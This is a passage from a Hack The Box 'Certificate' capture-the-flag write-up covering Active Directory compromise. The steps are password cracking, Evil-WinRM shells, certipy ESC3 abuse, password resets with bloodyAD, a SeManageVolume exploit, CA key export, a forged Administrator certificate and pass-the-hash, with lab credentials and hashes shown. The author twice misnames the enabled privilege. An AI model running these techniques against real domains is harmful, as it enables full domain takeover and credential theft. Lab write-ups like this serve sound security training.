Time.Started.....: Tue Jun  3 05:44:52 2025 (3 secs)
Time.Estimated...: Tue Jun  3 05:44:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5021 H/s (3.83ms) @ Accel:32 Loops:1024 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13952/14344385 (0.10%)
Rejected.........: 0/13952 (0.00%)
Restore.Point....: 13824/14344385 (0.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3072-4095
Candidate.Engine.: Device Generator
Candidates.#1....: goodman -> garage
Hardware.Mon.#1..: Util: 77%

Started: Tue Jun  3 05:44:48 2025
Stopped: Tue Jun  3 05:44:56 2025
```

Got the password for `lion.sk` user. <br>

```text
└─$ evil-winrm -i certificate.htb -u "lion.sk" -p '!QAZ2wsx'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> dir


    Directory: C:\Users\Lion.SK\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/3/2025   3:23 AM             34 user.txt
```

This `.pcap` file is great that we unable to crack `Administrator` hash but can get the `lion.sk` user hash. <br>
&rarr; Notice that there are also other way to exploit for `user.txt` flag.

### Active Directory Certificate Services (AD CS)
If we continue this flow, let's find the vulnerability template for `lion.sk` user.
```bash
└─$ certipy find -u lion.sk -p '!QAZ2wsx'  -target certificate.htb -text -stdout -vulnerable 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.405 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

Found out that `Delegated-CRA` template is vulnerable to `ESC3` attack. <br>
&rarr; Use this [ESC3](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template) to exploit.

First, we will obtain an Delegated-CRA certificate.
```bash
└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.136.196 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'        
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

Then use the Delegated-CRA certificate to request a certificate on behalf of the target user.
```bash
└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.136.196 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'User' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[-] Got error while requesting certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.
Would you like to save the private key? (y/N): y
[*] Saving private key to '22.key'
[*] Wrote private key to '22.key'
[-] Failed to request certificate
```

Hmm, look like there is this template is not supported, let's to find enable template to request certificate on behalf of the target user.
```bash
└─$ certipy find -u lion.sk -p '!QAZ2wsx' -target certificate.htb -enabled -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.
```

Found out that `SignedUser` template is enabled and can be used to request certificate on behalf of the target user. <br>

```bash
└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.136.196 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'   
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 24
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

Now we can authenticate using the "on-behalf-of" certificate.
```bash
└─$ certipy auth -pfx ryan.k.pfx -username 'ryan.k' -domain 'certificate.htb' -dc-ip 10.129.136.196                                                                         
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:beb8327809ebfd3d69cc1764335687cf
```

Got the `ryan.k` user hash. <br>

```text
└─$ evil-winrm -i certificate.htb -u "ryan.k" -H "beb8327809ebfd3d69cc1764335687cf"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

There is `SeImpersonatePrivilege` privilege enabled. <br>

This has been exploited later below, we can see that there are 2 approach to exploit to get some credentials. <br>
&rarr; Now let's back to other approach to get the `user.txt` flag and further more.

### Bloodhound
```bash
└─$ bloodhound-python -u 'sara.b' -p 'Blink182' -d certificate.htb -c All -o bloodhound_results.json -ns 10.129.8.163       
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Querying computer: DC01.certificate.htb
INFO: Done in 00M 06S
```

Turn on `neo4j` and `BloodHound` to visualize the graph.

![BloodHound](/assets/img/certificate-htb-season8/certificate-htb-season8_bloodhound.png)
![BloodHound](/assets/img/certificate-htb-season8/certificate-htb-season8_bloodhound_2.png)

Go to the Transitive Object Control (Outbound object control) on `Node Info` tab and found out that `sara.b` is member of `ACCOUNT OPERATORS@CERTIFICATE.HTB` group. <br>

Then click on the `ACCOUNT OPERATORS@CERTIFICATE.HTB` group and look for Reachable High Value Targets (Overview) on the `Node Info` tab. <br>

![BloodHound](/assets/img/certificate-htb-season8/certificate-htb-season8_bloodhound_3.png)

So this group has `GenericAll` to `lion.sk` and `ryan.k` user. <br>
&rarr; We can abuse to reset the password for both user.

### Reset Password
```bash
└─$ bloodyAD -u sara.b -p 'Blink182' -d certificate.htb --dc-ip 10.129.8.163 set password lion.sk 'P4ssword@123'
[+] Password changed successfully!
```

```text
└─$ evil-winrm -i certificate.htb -u "lion.sk" -p "P4ssword@123"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> dir
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> cd ..
*Evil-WinRM* PS C:\Users\Lion.SK> cd Desktop
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> dir


    Directory: C:\Users\Lion.SK\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/1/2025   5:27 AM             34 user.txt


*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> type user.txt
79d2b5652dd8915c688f7660c9424117
```

Got the `user.txt` flag. <br>

## Privilege Escalation
Check for `whoami /priv` on `lion.sk` user.
```bash
└─$ evil-winrm -i certificate.htb -u "lion.sk" -p "P4ssword@123"
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Hmm, seem like nothing interesting. <br>
Let's check out the `ryan.k` user. Also change the password for `ryan.k` user.
```bash
└─$ bloodyAD -u sara.b -p 'Blink182' -d certificate.htb --dc-ip 10.129.8.163 set password ryan.k 'P4ssword@1234'
[+] Password changed successfully!
```

```text
└─$ evil-winrm -i certificate.htb -u "ryan.k" -p "P4ssword@1234" 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

There is `SeImpersonatePrivilege` privilege enabled. <br>
&rarr; Let's research more about it.

Found out this repo [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit). <br>
&rarr; Grab the release file and transfer to the target machine.

```bash
└─$ wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
```

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> upload SeManageVolumeExploit.exe
                                        
Info: Uploading /home/kali/HTB_Labs/DEPTHS_Season8/Certificate/SeManageVolumeExploit.exe to C:\Users\Ryan.K\Documents\SeManageVolumeExploit.exe
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
```

Let's run it.
```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
Entries changed: 837

DONE
```

Now `ryan.k` has full permission on `C:\` drive for all users on the machine. <br>
Before continue, let's check bloodhound again for `ryan.k` user.

![BloodHound](/assets/img/certificate-htb-season8/certificate-htb-season8_bloodhound_4.png)

![BloodHound](/assets/img/certificate-htb-season8/certificate-htb-season8_bloodhound_5.png)

See that `ryan.k` is the member of `DOMAIN ADMINS@CERTIFICATE.HTB` group. <br>
&rarr; Let's perfom ADCS attack.

### Active Directory Certificate Services (AD CS)
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX my "Certificate-LTD-CA" C:\tmp\ca.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file C:\tmp\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

We gonna use `certutil` to export the CA certificate and private key to a `.pfx` file. <br>
- `certutil`: Windows utility to manage certificates
- `-exportPFX`: Export certificate + private key to PFX/PKCS#12 format
- `my`: Certificate store location ("My" = Personal certificate store)
- `"Certificate-LTD-CA"`: Name of the CA certificate to export
- `C:\tmp\ca.pfx`: Output file path

```powershell
*Evil-WinRM* PS C:\tmp> dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2025   4:02 PM           2675 ca.pfx
```

Let's transfer the `ca.pfx` file to the target machine.
```powershell
*Evil-WinRM* PS C:\tmp> download ca.pfx
                                        
Info: Downloading C:\tmp\ca.pfx to ca.pfx
                                        
Info: Download successful!
```

Next we gonna forge the certificate.

```bash
└─$ certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject "CN=Administrator,CN=Users,DC=certificate,DC=htb" -out admin_forged.pfx 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'admin_forged.pfx'
[*] Wrote forged certificate and private key to 'admin_forged.pfx'
```

- `certipy-ad forge`: Fake certificate generation feature
- `-ca-pfx ca.pfx`: Use CA certificate + private key exported from Windows
- `-upn administrator@certificate.htb`: User Principal Name of target user
- `-subject "CN=Administrator,CN=Users,DC=certificate,DC=htb"`: Distinguished Name of Administrator
- `-out admin_forged.pfx`: Output file containing forged certificate

→ Create a valid certificate for Administrator account using stolen CA's private key.

Now let's authenticate with the forged certificate.
```bash
└─$ certipy auth -pfx admin_forged.pfx -dc-ip 10.129.8.163   
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

- `certipy auth`: Certipy's Authentication module
- `-pfx admin_forged.pfx`: Use forged certificate to authenticate
- `-dc-ip $TARGET_IP`: IP address of Domain Controller

→ Use forged certificate to authenticate as Administrator and get credentials.

We are able to grab the Administrator's hash. <br>
```text
└─$ evil-winrm -i certificate.htb -u "administrator" -H "d804304519bf0143c14cbf1c024408c6"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/1/2025   5:27 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4315e47d3c2ae54fa05861daaec3c02b
```

Got the `root.txt` flag. <br>

![result](/assets/img/certificate-htb-season8/certificate-htb-season8_result.png)